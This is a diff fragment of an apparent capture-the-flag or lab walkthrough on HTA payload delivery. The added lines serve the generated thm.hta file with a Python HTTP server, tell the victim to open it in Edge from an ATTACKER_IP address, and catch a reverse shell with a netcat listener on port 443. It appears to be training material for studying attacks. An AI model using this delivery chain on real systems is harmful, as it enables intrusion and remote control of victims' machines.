@@ -28,6 +28,12 @@ Final size of hta-psh file: 7692 bytes
 Saved as: thm.hta
 ```
 ```
+user@machine$ python3 -m http.server 8090
+Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/)
+```
+On the victim machine, visit the malicious link using Microsoft Edge, http://ATTACKER_IP:PORT/payload.hta  
+
+```
 user@machine$ sudo nc -lvp 443
 listening on [any] 443 ...
 10.8.232.37: inverse host lookup failed: Unknown host
